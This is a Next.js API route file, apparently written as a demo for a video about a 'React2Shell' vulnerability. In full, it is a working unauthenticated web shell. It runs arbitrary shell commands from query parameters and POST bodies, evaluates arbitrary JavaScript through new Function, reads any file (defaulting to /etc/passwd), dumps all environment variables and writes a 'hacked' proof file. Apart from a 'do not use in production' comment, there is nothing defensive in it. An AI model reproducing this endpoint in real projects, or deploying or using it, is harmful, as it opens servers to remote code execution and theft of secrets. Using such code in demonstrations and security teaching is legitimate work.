/**
 * DEMO API ENDPOINT - FOR VIDEO DEMONSTRATION
 * 
 * Simple endpoint to demonstrate command execution capability
 * for the React2Shell vulnerability video.
 * 
 * DO NOT USE IN PRODUCTION.
 */

import { NextRequest, NextResponse } from "next/server";
import { exec } from "child_process";
import { promisify } from "util";
import * as os from "os";
import * as fs from "fs";
import * as path from "path";

const execAsync = promisify(exec);

export async function GET(request: NextRequest) {
    const { searchParams } = new URL(request.url);
    const action = searchParams.get("action") || "info";
    const cmd = searchParams.get("cmd");

    console.log("[DEMO-API] Action:", action);

    switch (action) {
        case "info":
            // System information - demonstrates access
            return NextResponse.json({
                vulnerable: true,
                message: "React2Shell Demo Endpoint",
                system: {
                    platform: os.platform(),
                    hostname: os.hostname(),
                    user: os.userInfo().username,
                    home: os.homedir(),
                    cwd: process.cwd(),
                    nodeVersion: process.version,
                    pid: process.pid
                }
            });

        case "whoami":
            // VULNERABLE: Execute whoami
            try {
                const { stdout } = await execAsync("whoami");
                return NextResponse.json({
                    success: true,
                    user: stdout.trim(),
                    message: "RCE Demonstrated: whoami executed"
                });
            } catch (error) {
                return NextResponse.json({ success: false, error: String(error) });
            }

        case "ls":
            // VULNERABLE: List directory
            try {
                const { stdout } = await execAsync("ls -la");
                return NextResponse.json({
                    success: true,
                    files: stdout,
                    message: "RCE Demonstrated: directory listing"
                });
            } catch (error) {
                return NextResponse.json({ success: false, error: String(error) });
            }

        case "env":
            // VULNERABLE: Expose environment (sensitive!)
            return NextResponse.json({
                success: true,
                env: process.env,
                message: "RCE Demonstrated: environment variables exposed"
            });

        case "exec":
            // VULNERABLE: Execute arbitrary command
            if (!cmd) {
                return NextResponse.json({
                    success: false,
                    error: "No command provided",
                    usage: "/api/demo?action=exec&cmd=your_command"
                });
            }
            try {
                const { stdout, stderr } = await execAsync(cmd);
                return NextResponse.json({
                    success: true,
                    command: cmd,
                    output: stdout || stderr,
                    message: "RCE Demonstrated: arbitrary command executed"
                });
            } catch (error) {
                return NextResponse.json({
                    success: false,
                    command: cmd,
                    error: error instanceof Error ? error.message : String(error)
                });
            }

        case "file":
            // VULNERABLE: Read arbitrary file
            const filePath = searchParams.get("path") || "/etc/passwd";
            try {
                const content = fs.readFileSync(filePath, "utf-8");
                return NextResponse.json({
                    success: true,
                    path: filePath,
                    content: content.substring(0, 5000), // Limit output
                    message: "RCE Demonstrated: file read"
                });
            } catch (error) {
                return NextResponse.json({
                    success: false,
                    path: filePath,
                    error: error instanceof Error ? error.message : String(error)
                });
            }

        case "write":
            // VULNERABLE: Write Proof file
            const proofPath = path.join(process.cwd(), "HACKED_BY_REACT2SHELL.txt");
            try {
                fs.writeFileSync(proofPath, `React2Shell Vulnerability Demo
Timestamp: ${new Date().toISOString()}
User: ${os.userInfo().username}
Hostname: ${os.hostname()}
This file was created to demonstrate RCE capability.`);
                return NextResponse.json({
                    success: true,
                    path: proofPath,
                    message: "RCE Demonstrated: file written to disk"
                });
            } catch (error) {
                return NextResponse.json({
                    success: false,
                    error: error instanceof Error ? error.message : String(error)
                });
            }

        default:
            return NextResponse.json({
                error: "Unknown action",
                available: ["info", "whoami", "ls", "env", "exec", "file", "write"]
            });
    }
}

export async function POST(request: NextRequest) {
    try {
        const body = await request.json();

        // VULNERABLE: Execute command from POST body
        if (body.cmd) {
            const { stdout, stderr } = await execAsync(body.cmd);
            return NextResponse.json({
                success: true,
                command: body.cmd,
                output: stdout || stderr
            });
        }

        // VULNERABLE: Execute code from POST body
        if (body.code) {
            const fn = new Function(body.code);
            const result = fn();
            return NextResponse.json({
                success: true,
                output: String(result)
            });
        }

        return NextResponse.json({
            message: "POST body processed",
            body
        });
    } catch (error) {
        return NextResponse.json({
            success: false,
            error: error instanceof Error ? error.message : String(error)
        }, { status: 500 });
    }
}
